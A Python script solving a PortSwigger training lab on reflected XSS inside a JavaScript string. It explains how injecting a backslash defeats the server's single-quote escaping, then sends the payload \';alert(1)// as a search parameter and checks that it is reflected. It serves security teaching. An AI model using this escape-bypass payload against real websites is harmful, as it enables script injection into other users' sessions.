# Lab 22 — Reflected XSS into a JS string with angle brackets and double quotes
#           HTML-encoded and single quotes escaped
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
#
# Vulnerability: Search — JS string, < > " encoded, ' → \'
# Aim:           Call alert by defeating the escape mechanism
#
# Technique:
#   Angle brackets encoded → can't use </script> trick (lab 21 blocked).
#   Single quotes escaped: ' → \' → can't naively close the string.
#
#   But \ is NOT escaped. Inject \ before the server's escape:
#     Input:   \';alert(1)//
#     Server escapes the \: \\';alert(1)//
#     Resulting JS: var x = '\\';alert(1)//'
#                              ↑ literal backslash
#                                 ↑ closes the string (server's \ was consumed)
#
#   \\ in JS = one literal backslash character (not an escape prefix).
#   The ' that follows is no longer escaped → it closes the string.
#   alert(1) is now a free statement → executes.
#
# Usage: python xss_lab22.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "\\';alert(1)//"

if __name__ == "__main__":
    banner()
    section("LAB 22 — REFLECTED XSS: JS STRING, ANGLE BRACKETS + DOUBLE QUOTES ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab22.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "Escape-the-escaper payload")

    print()
    print("  ➜  Open this URL in a browser:")
    print(f"     {r.url}")
    print("  ℹ  The injected \\ becomes \\\\ in JS (literal backslash),")
    print("     leaving the \' unescaped → ' closes the string → alert executes.")
